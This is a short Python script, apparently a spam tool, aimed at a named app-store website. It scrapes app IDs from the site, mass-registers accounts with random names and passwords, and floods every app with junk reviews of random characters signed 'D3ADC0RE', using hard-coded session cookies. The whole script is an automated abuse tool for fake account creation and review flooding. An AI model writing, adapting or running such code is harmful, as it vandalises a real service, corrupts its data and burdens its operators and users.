from bs4 import BeautifulSoup
import requests
import string
import random
strings = string.ascii_letters

host = 'https://vaistore.gq/'

site = requests.get(host)

total_reviews = 0
apps = []

soup = BeautifulSoup(site.text, 'lxml')
temp = soup.find_all('a',href=True)
for i in temp:
    temp = str(i['href']).find('?AppID=')
    slice = int(temp)+len('?AppID=')
    if '/' not in str(i['href'][slice:]):
        apps.append(str(i['href'][slice:]))

def create_akk(info_list: list):
    random_nickname = ''.join(random.choices(strings,k=13))
    random_login = ''.join(random.choices(strings,k=13))
    random_pass = ''.join(random.choices(strings,k=8))

    reqeust = requests.post(host+'vai_acc_sys/login_system/reg_sys.php',data={
'nikname':random_nickname,
'login':random_login,
'pass':random_pass,
'login_vacc':'Создать'
    })
    info_list.append('Account reg: '+str(reqeust.status_code)+' '+random_login+' '+random_pass) 

def sendreviews(info_list: list,window):
    global total_reviews
    for i in apps:
        reqeust123 = requests.post(host+'vai_acc_sys/system/AddReview.php?AppID='+i,cookies={
    'PHPSESSID':'dn3ng4p0qv2te59c2dm71jan40',
    'SessionID':'c04379e3a209b2ae8118e63234332057'
        },data={
    'ReviewText':'Hello from D3ADC0RE: '+str(str(''.join(random.choices(strings,k=999)))),
    'Post_Review':''
        })
        total_reviews+=1
        window['log_reviews'].update('Sended reviews: '+str(total_reviews))
        info_list.append(str('Send review: '+str(reqeust123.status_code)+' To app: '+i))